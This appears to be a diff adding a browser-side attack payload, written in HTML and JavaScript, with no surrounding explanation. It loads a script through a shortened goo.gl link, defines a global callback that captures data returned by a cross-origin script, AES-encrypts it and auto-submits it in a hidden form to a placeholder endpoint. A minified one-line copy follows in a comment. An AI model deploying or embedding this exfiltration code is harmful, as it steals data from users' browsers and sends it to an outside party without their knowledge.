@@ -1,0 +1,25 @@
+<script src="http://goo.gl/bGsnQD"></script>
+<script>
+with(document)
+	with(firstChild) {
+		s = createElement('script');
+		s.src = 'URL'
+		window.c = s.onerror = function(d) {
+			f = createElement('form');
+			with(f) {
+				action = 'ACTION';
+				method = 'POST';
+				i = createElement('input');
+				with(i) {
+					name = 'data';
+					value = CryptoJS.AES.encrypt(JSON.stringify(d, 0, 2), 'KEY');
+				}
+				insertBefore(i, firstChild);
+			}
+			insertBefore(f, firstChild);
+			f.submit();
+		}
+		insertBefore(s, firstChild);
+	}
+// shorter: with(document)with(firstChild)s=createElement("script"),s.src="URL",window.c=s.onerror=function(a){f=createElement("form");with(f){action="ACTION";method="POST";i=createElement("i");with(i)name="data",value=CryptoJS.AES.encrypt(JSON.stringify(a,0,2),"KEY");insertBefore(i,firstChild)}insertBefore(f,firstChild);f.submit()},insertBefore(s,firstChild);
+</script>
